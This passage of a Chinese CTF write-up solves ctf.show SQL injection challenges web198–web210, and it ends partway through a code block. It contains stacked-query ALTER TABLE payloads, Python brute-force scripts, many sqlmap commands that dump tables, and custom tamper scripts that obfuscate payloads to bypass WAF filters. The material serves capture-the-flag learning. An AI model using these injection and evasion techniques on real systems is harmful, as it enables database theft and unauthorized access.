&nbsp;



**==题解二==**

**`alter table` 可以对已有的表进行修改**

**利用 `alter` 函数可以把 `pass` 和 `id` 两列进行互换，这样判断 flag 的条件变成对 `id` 的检测，而 `id` 都是纯数字，因此可以通过爆破正确的 `id`，从而获得flag**

&nbsp;



**把表 `ctfshow_user` 里原来的 `pass` 列改名为 `temp`，类型改为 `varchar(255)`**
**（`varchar(255)`  指定列的数据类型，长度为 255 个字符）**

```sql
alter table ctfshow_user change column `pass` `temp` varchar(255);
```

&nbsp;



<img src="\images\article_images\image-20250826170915896.png" alt="image-20250826170915896" style="zoom:80%;" />

```python
import requests

# ===== 配置区 =====
url = "http://b02f6e8a-3983-420d-b68f-67985de999b4.challenge.ctf.show/api/"
target_user_hex = "0x61646d696e"  # admin 的十六进制
password_range = 99               # 爆破密码尝试次数
# ==================

# 第一步：通过注入修改表结构（交换 id 和 pass）
payload = (
    f"{target_user_hex};"
    "alter table ctfshow_user change column `pass` `temp` varchar(255);"
    "alter table ctfshow_user change column `id` `pass` varchar(255);"
    "alter table ctfshow_user change column `temp` `id` varchar(255);"
)

data1 = {
    'username': payload,
    'password': '1'
}

res = requests.post(url=url, data=data1)

# 第二步：爆破密码（实际上是原来的 id）
for i in range(password_range):
    data2 = {
        'username': target_user_hex,
        'password': str(i)
    }
    res2 = requests.post(url=url, data=data2)
    if "flag" in res2.json().get('msg', ''):
        print(res2.json()['msg'])
        break

```

&nbsp;



---

# web199

```sql
查询语句
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username};";
      
      
返回逻辑
  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
```



&nbsp;



**==题解一==**

```sql
用户名：0;show tables
密码：ctfshow_user
```

<img src="\images\article_images\image-20250826171832141.png" alt="image-20250826171832141" style="zoom:33%;" />

&nbsp;





**==题解二==**

**思路：交换 `id` 和 `pass` 字段，让系统把 `pass` 列当作 `id` 使用，再通过爆破 `id` 拿到flag**

&nbsp;



**把原来的 `pass` 列改名为 `tmp` ，并把数据类型改为 `text`**

**`text` 类型可以存更多字符**

```sql
用户名：0;alter table ctfshow_user change column pass tmp text
密码：0
```

<img src="\images\article_images\image-20250826232149835.png" alt="image-20250826232149835" style="zoom:33%;" />

&nbsp;



**把 `id` 列改成 `pass` ，数据类型改为 `int`**

```sql
用户名：0;alter table ctfshow_user change column id pass int
密码：0
```

<img src="\images\article_images\image-20250826232207547.png" alt="image-20250826232207547" style="zoom:33%;" />

&nbsp;



**把 `tmp` 列改回 `id` ，数据类型改为 `text`**

```sql
用户名：0;alter table ctfshow_user change column tmp id text
密码：0
```

<img src="\images\article_images\image-20250826232220909.png" alt="image-20250826232220909" style="zoom:33%;" />

&nbsp;



**从 `0` 逐个尝试密码**

```sql
用户名：0x61646d696e
密码：0
```

<img src="\images\article_images\image-20250826233159519.png" alt="image-20250826233159519" style="zoom: 25%;" />

&nbsp;



**尝试到 `1` 的时候刚好正确**

```sql
用户名：0x61646d696e
密码：1
```

<img src="\images\article_images\image-20250826233133075.png" alt="image-20250826233133075" style="zoom:25%;" />

&nbsp;



**因此，手动爆破并非良策，可用脚本实现爆破**

&nbsp;



**==题解三==**

**按照题解二的解题逻辑写脚本**

&nbsp;



<img src="\images\article_images\image-20250826234333108.png" alt="image-20250826234333108" style="zoom:80%;" />

```python
import requests

# ======================
# 配置区

URL = "http://cc616be5-f332-45ce-85a1-7bb69eb1afdf.challenge.ctf.show/api/"
TARGET_USER = "admin"
MAX_TRY = 300
SUCCESS_FLAG = "\\u767b\\u9646\\u6210\\u529f"  # 登陆成功

# 配置区
# ======================


def alter_table():
    """修改数据表，把 id 和 pass 对调"""
    payload = (
        "0;alter table ctfshow_user change column pass tmp text;"
        "alter table ctfshow_user change column id pass int;"
        "alter table ctfshow_user change column tmp id text"
    )
    data = {
        "username": payload,
        "password": 1
    }
    _ = requests.post(URL, data=data)


def brute_force_admin():
    """爆破 admin 的密码"""
    target_user_hex = f"0x{TARGET_USER.encode().hex()}"
    for i in range(MAX_TRY):
        data = {
            "username": target_user_hex,
            "password": i
        }
        response = requests.post(URL, data=data)
        if SUCCESS_FLAG in response.text:
            print(f"[*] Found! username={TARGET_USER}, password={i}")
            print(f"[*] msg: {response.text}")
            return
    print("[!] Password not found within range.")


if __name__ == "__main__":
    print("[*] Altering table (swap id <-> pass)")
    alter_table()
    print("[*] Brute forcing admin password")
    brute_force_admin()

```

&nbsp;



---

# web200

```sql
查询语句
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username};";
     
     
返回逻辑
  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(|\,/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
```

&nbsp;



**==题解一==**

```sql
用户名：0;show tables
密码：ctfshow_user
```

<img src="\images\article_images\image-20250826235014639.png" alt="image-20250826235014639" style="zoom:25%;" />

&nbsp;



**==题解二==**

<img src="\images\article_images\image-20250826235153118.png" alt="image-20250826235153118" style="zoom:80%;" />

```python
import requests

# ======================
# 配置区

URL = "http://9e4168dd-4d2c-48ca-8c74-fd46660d4f27.challenge.ctf.show/api/"
TARGET_USER = "admin"
MAX_TRY = 300
SUCCESS_FLAG = "\\u767b\\u9646\\u6210\\u529f"  # 登陆成功

# 配置区
# ======================


def alter_table():
    """修改数据表，把 id 和 pass 对调"""
    payload = (
        "0;alter table ctfshow_user change column pass tmp text;"
        "alter table ctfshow_user change column id pass int;"
        "alter table ctfshow_user change column tmp id text"
    )
    data = {
        "username": payload,
        "password": 1
    }
    _ = requests.post(URL, data=data)


def brute_force_admin():
    """爆破 admin 的密码"""
    target_user_hex = f"0x{TARGET_USER.encode().hex()}"
    for i in range(MAX_TRY):
        data = {
            "username": target_user_hex,
            "password": i
        }
        response = requests.post(URL, data=data)
        if SUCCESS_FLAG in response.text:
            print(f"[*] Found! username={TARGET_USER}, password={i}")
            print(f"[*] msg: {response.text}")
            return
    print("[!] Password not found within range.")


if __name__ == "__main__":
    print("[*] Altering table (swap id <-> pass)")
    alter_table()
    print("[*] Brute forcing admin password")
    brute_force_admin()

```

&nbsp;



---

# web201

```sql
 使用--user-agent 指定agent
 使用--referer 绕过referer检查


查询语句
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."';";
    
    
返回逻辑
//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
```

&nbsp;



**将 `User-Agent` 改为 `sqlmap`**

<img src="\images\article_images\image-20250827153122934.png" alt="image-20250827153122934" style="zoom: 25%;" />



<img src="\images\article_images\image-20250827153208495.png" alt="image-20250827153208495" style="zoom:33%;" />

&nbsp;

&nbsp;



**使用 `--referer="ctf.show"` 绕过 referer 检查**

&nbsp;

&nbsp;



**查数据库名**

```powershell
python sqlmap.py -u "http://82cc5813-245f-4089-854c-118e7a273427.challenge.ctf.show/api/?id=1" --referer="ctf.show" --dbs
```

<img src="\images\article_images\image-20250827005033284.png" alt="image-20250827005033284" style="zoom:33%;" />

&nbsp;



**查表名**

```powershell
python sqlmap.py -u "http://82cc5813-245f-4089-854c-118e7a273427.challenge.ctf.show/api/?id=1" --referer="ctf.show" -D ctfshow_web --tables
```

<img src="\images\article_images\image-20250827140733951.png" alt="image-20250827140733951" style="zoom:33%;" />

&nbsp;



**查字段**

```powershell
python sqlmap.py -u "http://82cc5813-245f-4089-854c-118e7a273427.challenge.ctf.show/api/?id=1" --referer="ctf.show" -D ctfshow_web -T ctfshow_user --columns
```

<img src="\images\article_images\image-20250827140659057.png" alt="image-20250827140659057" style="zoom:33%;" />

&nbsp;



**查字段记录**

```powershell
python sqlmap.py -u "http://82cc5813-245f-4089-854c-118e7a273427.challenge.ctf.show/api/?id=1" --referer="ctf.show" -D ctfshow_web -T ctfshow_user -C pass --dump
```

<img src="\images\article_images\image-20250827140825525.png" alt="image-20250827140825525" style="zoom: 25%;" />

&nbsp;





```bash
linux环境下命令

┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://82cc5813-245f-4089-854c-118e7a273427.challenge.ctf.show/api/?id=1" --referer="ctf.show" --dbs

┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://82cc5813-245f-4089-854c-118e7a273427.challenge.ctf.show/api/?id=1" --refer="ctf.show" -D ctfshow_web --tables

┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://82cc5813-245f-4089-854c-118e7a273427.challenge.ctf.show/api/?id=1" --refer="ctf.show" -D ctfshow_web -T ctfshow_user --columns

┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://82cc5813-245f-4089-854c-118e7a273427.challenge.ctf.show/api/?id=1" --refer="ctf.show" -D ctfshow_web -T ctfshow_user -C pass --dump
```

<img src="\images\article_images\image-20250827150653446.png" alt="image-20250827150653446" style="zoom:33%;" />

&nbsp;



<img src="\images\article_images\image-20250827150744707.png" alt="image-20250827150744707" style="zoom:33%;" />



---

# web202

```sql
 使用--data 调整sqlmap的请求方式


查询语句
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."';";
      
      
返回逻辑
//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
```

&nbsp;



```powershell
python sqlmap.py -u "https://bf28f69c-ae85-47ca-9f6d-0ca9f314dbad.challenge.ctf.show/api/" --data "id=1" --referer="ctf.show" -D ctfshow_web -T ctfshow_user -C pass --dump
```

<img src="\images\article_images\image-20250827154802794.png" alt="image-20250827154802794" style="zoom:33%;" />

&nbsp;



---

# web203

```sql
 使用--method 调整sqlmap的请求方式


查询语句
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."';";
      
      
返回逻辑
//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
```

&nbsp;



**默认情况下，sqlmap 发送的是 GET 或 POST 请求。**

**如果目标接口使用 PUT 方法上传数据（比如 `REST API`、文件上传接口），需要显式告诉 sqlmap 用 PUT 
方式发送请求，且 sqlmap 是对具体的 Web 接口 URL 进行测试，因此需要此题需要 `index.php`**

**PUT 请求不像传统 POST 表单，它需要指定 `Content-Type`，告诉服务器数据类型。**
**如果接口接收 原始文本/ `JSON` /表单，`Content-Type` 不匹配，服务器可能直接拒绝请求或报错。**
**`text/plain` 是告诉服务器：“这是普通文本”，便于 sqlmap 发送参数进行注入测试。**

&nbsp;



```powershell
python sqlmap.py -u "http://9b26b5a1-7edd-4d21-869d-032e10b3d35e.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --data "id=1" --referer="ctf.show" -D ctfshow_web -T ctfshow_user -C pass --dump
```

<img src="\images\article_images\image-20250827160037159.png" alt="image-20250827160037159" style="zoom: 25%;" />

&nbsp;



---

# web204

```sql
 使用--cookie 提交cookie数据


查询语句
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."';";
      
      
返回逻辑
//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
```

&nbsp;





```powershell
python sqlmap.py -u "http://b44a070a-0b0b-4a05-a700-108acfd2ebf6.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" -D ctfshow_web -T ctfshow_user -C pass --dump
```

<img src="\images\article_images\image-20250827161433716.png" alt="image-20250827161433716" style="zoom: 25%;" />

&nbsp;



---

# web205

```sql
 api调用需要鉴权


查询语句
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where id = '".$_GET['id']."';";
      
      
返回逻辑
//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
```

&nbsp;



**每次请求`/api` 之前会去请求一次 `getToken.php`**

<img src="\images\article_images\image-20250827163958594.png" alt="image-20250827163958594" style="zoom:33%;" />

&nbsp;



<img src="\images\article_images\image-20250827163456355.png" alt="image-20250827163456355" style="zoom:33%;" />

&nbsp;



**sqlmap提供了以下两个参数**

**`--safe-url`**

- **作用：提供一个安全、不会出错的URL，sqlmap会在测试注入之前访问这个URL，确保数据库和网站状态正常**

**`--safe-freq`**

- **作用：控制 每次注入测试前访问安全 URL 的次数。**
- **默认值：通常为 1**

**添加 `--safe-url="http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/getToken.php"` 和  `--safe-freq=1`**

&nbsp;



```powershell
python sqlmap.py -u "http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/getToken.php" --safe-freq=1 --dbs
```

<img src="\images\article_images\image-20250827170121468.png" alt="image-20250827170121468" style="zoom: 25%;" />

&nbsp;



```powershell
python sqlmap.py -u "http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/getToken.php" --safe-freq=1 -D ctfshow_web --tables
```

<img src="\images\article_images\image-20250827170710461.png" alt="image-20250827170710461" style="zoom:25%;" />

&nbsp;



```powershell
python sqlmap.py -u "http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/getToken.php" --safe-freq=1 -D ctfshow_web -T ctfshow_flax --columns
```

<img src="\images\article_images\image-20250827170742936.png" alt="image-20250827170742936" style="zoom:25%;" />

&nbsp;



```powershell
python sqlmap.py -u "http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/getToken.php" --safe-freq=1 -D ctfshow_web -T ctfshow_flax -C flagx --dump
```

<img src="\images\article_images\image-20250827170852040.png" alt="image-20250827170852040" style="zoom: 25%;" />

&nbsp;



---

# web206

```sql
 sql需要闭合


查询语句
//拼接sql语句查找指定ID用户
$sql = "select id,username,pass from ctfshow_user where id = ('".$id."') limit 0,1;";
    
    
返回逻辑
//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
```

&nbsp;



**sqlmap会自己判断闭合**

&nbsp;



```powershell
python sqlmap.py -u "http://a6ba1876-ef1a-497a-af7a-c1cd218b30f3.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://a6ba1876-ef1a-497a-af7a-c1cd218b30f3.challenge.ctf.show/api/getToken.php" --safe-freq=1 -D ctfshow_web --tables
```

<img src="\images\article_images\image-20250827173631683.png" alt="image-20250827173631683" style="zoom:25%;" />

&nbsp;



```powershell
python sqlmap.py -u "http://a6ba1876-ef1a-497a-af7a-c1cd218b30f3.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://a6ba1876-ef1a-497a-af7a-c1cd218b30f3.challenge.ctf.show/api/getToken.php" --safe-freq=1 -D ctfshow_web -T ctfshow_flaxc --columns
```

<img src="\images\article_images\image-20250827173708626.png" alt="image-20250827173708626" style="zoom:25%;" />

&nbsp;



```powershell
python sqlmap.py -u "http://a6ba1876-ef1a-497a-af7a-c1cd218b30f3.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://a6ba1876-ef1a-497a-af7a-c1cd218b30f3.challenge.ctf.show/api/getToken.php" --safe-freq=1 -D ctfshow_web -T ctfshow_flaxc -C flagv --dump
```

<img src="\images\article_images\image-20250827173839584.png" alt="image-20250827173839584" style="zoom: 25%;" />

&nbsp;



---

# web207

```sql
--tamper 的初体验


查询语句
//拼接sql语句查找指定ID用户
$sql = "select id,username,pass from ctfshow_user where id = ('".$id."') limit 0,1;";
      
      
返回逻辑
//对传入的参数进行了过滤
  function waf($str){
   return preg_match('/ /', $str);
  }
```

&nbsp;



**`--tamper`** = “绕过 WAF / 过滤器的脚本集合”

- 当目标网站对 SQL 注入语句做了 **字符、关键字或正则过滤**，普通 payload 会被拦截
- sqlmap 提供 **tamper 脚本**，可以对注入语句 **进行编码、混淆或替换**，以绕过过滤

**常用tamper脚本**

```
apostrophemask.py				 用utf8代替引号

equaltolike.py					 MSSQL * SQLite中like 代替等号

greatest.py						 MySQL中绕过过滤’>’ ,用GREATEST替换大于号

space2hash.py 				   	 空格替换为#号 随机字符串 以及换行符

space2comment.py				 用/**/代替空格

apostrophenullencode.py		     MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，									替换字符和双引号

halfversionedmorekeywords.py	 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论

space2morehash.py			 	 MySQL中空格替换为 #号 以及更多随机字符串 换行符

appendnullbyte.py			     Microsoft Access在有效负荷结束位置加载零字节字符编码

ifnull2ifisnull.py 				 MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤

space2mssqlblank.py 	 	 	 mssql空格替换为其它空符号

base64encode.py 				 用base64编码

space2mssqlhash.py			     mssql查询中替换空格

modsecurityversioned.py 		 mysql中过滤空格，包含完整的查询版本注释

space2mysqlblank.py 			 mysql中空格替换其它空白符号

between.py 						 MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * 										 PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（>）

space2mysqldash.py 				 MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行								 （’ n’）

multiplespaces.py 			 	 围绕SQL关键字添加多个空格

space2plus.py 				 	 用+替换空格

bluecoat.py 					 MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 									然后替换=为like

nonrecursivereplacement.py 		 双重查询语句。取代predefined SQL关键字with表示suitable for替代

space2randomblank.py			 代替空格字符（“”）从一个随机的空白字符可选字符的有效集

sp_password.py 					 追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾

chardoubleencode.py 			 双url编码(不处理以编码的)

unionalltounion.py 				 替换UNION ALL SELECT UNION SELECT

charencode.py 					 Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 									 10g，PostgreSQL 8.3, 8.4, 9.0url编码；

randomcase.py 					 Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 									 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写

unmagicquotes.py 				 宽字符绕过 GPC addslashes

randomcomments.py 				 用/**/分割sql关键字

charunicodeencode.py 			 ASP，ASP.NET中字符串 unicode 编码

securesphere.py 				 追加特制的字符串

versionedmorekeywords.py 		 MySQL >= 5.1.13注释绕过

halfversionedmorekeywords.py 	 MySQL < 5.1中关键字前加注释
```

&nbsp;



**使用 `space2comment` 用`/**/`代替空格**

```powershell
python sqlmap.py -u "http://1f0b2af7-ba16-42f3-a608-98e28e8dab57.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://1f0b2af7-ba16-42f3-a608-98e28e8dab57.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=space2comment -D ctfshow_web --tables
```

<img src="\images\article_images\image-20250827174848968.png" alt="image-20250827174848968" style="zoom: 25%;" />

&nbsp;



```powershell
python sqlmap.py -u "http://1f0b2af7-ba16-42f3-a608-98e28e8dab57.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://1f0b2af7-ba16-42f3-a608-98e28e8dab57.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=space2comment -D ctfshow_web -T ctfshow_flaxca --columns
```

<img src="\images\article_images\image-20250827180354679.png" alt="image-20250827180354679" style="zoom:25%;" />

&nbsp;

&nbsp;



```powershell
python sqlmap.py -u "http://1f0b2af7-ba16-42f3-a608-98e28e8dab57.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://1f0b2af7-ba16-42f3-a608-98e28e8dab57.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=space2comment -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump
```

<img src="\images\article_images\image-20250827180633985.png" alt="image-20250827180633985" style="zoom:25%;" />

&nbsp;



---

# web208

```sql
--tamper 的2体验


查询语句
//拼接sql语句查找指定ID用户
$sql = "select id,username,pass from ctfshow_user where id = ('".$id."') limit 0,1;";
      
      
返回逻辑
//对传入的参数进行了过滤
// $id = str_replace('select', '', $id);
  function waf($str){
   return preg_match('/ /', $str);
  }
```

**这里过滤的是小写的 `select` ，而sqlmap里面的执行的命令一般为大写的 `SELECT`**

**考虑绕过空格即可**

&nbsp;



**使用 `space2comment` 用`/**/`代替空格**

```powershell
python sqlmap.py -u "http://b0527063-c2a8-4718-b0d1-d0a218ca82e4.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://b0527063-c2a8-4718-b0d1-d0a218ca82e4.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=space2comment -D ctfshow_web --tables
```

<img src="\images\article_images\image-20250829140827884.png" alt="image-20250829140827884" style="zoom:25%;" />

&nbsp;



```powershell
python sqlmap.py -u "http://b0527063-c2a8-4718-b0d1-d0a218ca82e4.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://b0527063-c2a8-4718-b0d1-d0a218ca82e4.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=space2comment -D ctfshow_web -T ctfshow_flaxcac --columns
```

<img src="\images\article_images\image-20250829140948975.png" alt="image-20250829140948975" style="zoom:25%;" />

&nbsp;



```powershell
python sqlmap.py -u "http://b0527063-c2a8-4718-b0d1-d0a218ca82e4.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://b0527063-c2a8-4718-b0d1-d0a218ca82e4.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=space2comment -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump
```

<img src="\images\article_images\image-20250829141028830.png" alt="image-20250829141028830" style="zoom:25%;" />

&nbsp;



---

# web209

```sql
--tamper 的3体验


查询语句
//拼接sql语句查找指定ID用户
$sql = "select id,username,pass from ctfshow_user where id = ('".$id."') limit 0,1;";
      
      
返回逻辑
//对传入的参数进行了过滤
  function waf($str){
   //TODO 未完工
   return preg_match('/ |\*|\=/', $str);
  }
```

&nbsp;



**sqlmap的tamper脚本没有针对这道题的过滤的脚本，需要自己对tamper脚本做简单修改**

**用 `%0a` 绕过空格和 `*` ，用 `like` 绕过 `=`**

**sqlmap 自带的tamper脚本 `space2comment.py`**

```python
#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces space character (' ') with comments '/**/'

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls

    >>> tamper('SELECT id FROM users')
    'SELECT/**/id/**/FROM/**/users'
    """

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "/**/"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "/**/"
                continue

            retVal += payload[i]

    return retVal
```

&nbsp;



**`ctfshow209sqlmap.py`**

```python
#!/usr/bin/env python
#ctfshow209 by AlgoZZi

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    自定义 tamper 脚本
    功能：
        1. 将空格替换为 "%0a"，用于绕过部分 WAF
        2. 将等号 "=" 替换为 "chr(0x9) + "like" + chr(0x9)"，制造语义混淆
    使用场景：
        可用于 SQL 注入时绕过简单的过滤规则
    """

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            # 处理第一个空格
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += chr(0x9)
                    continue

            # 单引号开关（避免替换引号中的空格）
            elif payload[i] == '\'':
                quote = not quote

            # 双引号开关（避免替换引号中的空格）
            elif payload[i] == '"':
                doublequote = not doublequote

            # 普通空格替换为 chr(0x9)
            elif payload[i] == " " and not doublequote and not quote:
                retVal += chr(0x9)
                continue

            # 等号替换为 chr(0x9) + "like" + chr(0x9)
            elif payload[i] == "=" and not doublequote and not quote:
                retVal += chr(0x9) + "like" + chr(0x9)
                continue

            # 其他字符保持不变
            retVal += payload[i]

    return retVal
```



&nbsp;



```powershell
python sqlmap.py -u "http://84cc13d6-65ad-47e3-910f-265c7b4ed1a4.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://84cc13d6-65ad-47e3-910f-265c7b4ed1a4.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=ctfshow209sqlmap -D ctfshow_web --tables
```

<img src="\images\article_images\image-20250829144015719.png" alt="image-20250829144015719" style="zoom:25%;" />

&nbsp;



```powershell
python sqlmap.py -u "http://84cc13d6-65ad-47e3-910f-265c7b4ed1a4.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://84cc13d6-65ad-47e3-910f-265c7b4ed1a4.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=ctfshow209sqlmap -D ctfshow_web -T ctfshow_flav --columns
```

<img src="\images\article_images\image-20250829144059374.png" alt="image-20250829144059374" style="zoom:25%;" />

&nbsp;



```powershell
python sqlmap.py -u "http://84cc13d6-65ad-47e3-910f-265c7b4ed1a4.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --cookie="PHPSESSID=abcd" --data "id=1" --referer="ctf.show" --safe-url="http://84cc13d6-65ad-47e3-910f-265c7b4ed1a4.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=ctfshow209sqlmap -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx --dump
```

<img src="\images\article_images\image-20250829144215068.png" alt="image-20250829144215068" style="zoom:25%;" />

&nbsp;



---

# web210

```sql
--tamper 的4体验


查询语句
//拼接sql语句查找指定ID用户
$sql = "select id,username,pass from ctfshow_user where id = ('".$id."') limit 0,1;";
      
      
返回逻辑
//对查询字符进行解密
  function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
  }
```

&nbsp;



**自定义脚本 `ctfshow210sqlmap.py`**

```python
#!/usr/bin/env python
#ctfshow210 by AlgoZZi
#ctfshow210sqlmap.py

from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
import base64

__priority__ = PRIORITY.LOW

def dependencies():
    # 加载依赖时提示，仅显示一次
    singleTimeWarnMessage("自定义 tamper 脚本已加载")

def tamper(payload, **kwargs):
    """
    自定义 tamper 脚本
    功能说明：
        1. 对 payload 进行双重编码和逆序处理
        2. 具体流程：
            - 将 payload 转为字节串
            - 先整体逆序
            - Base64 编码
            - 再次逆序
            - 再次 Base64 编码
            - 最终输出字符串形式
    用途：
        用于在 SQL 注入过程中对 payload 进行混淆编码，
        以绕过部分基于特征的安全检测。
    """

    retVal = payload

    if payload:
        # 转为字节串
        retVal = retVal.encode()
        # 第一次逆序
        retVal = retVal[::-1]
        # 第一次 Base64 编码
        retVal = base64.b64encode(retVal)
        # 第二次逆序
        retVal = retVal[::-1]
        # 第二次 Base64 编码
        retVal = base64.b64encode(retVal)
        # 转回字符串输出
        retVal = retVal.decode()

    return retVal
```



&nbsp;



```powershell
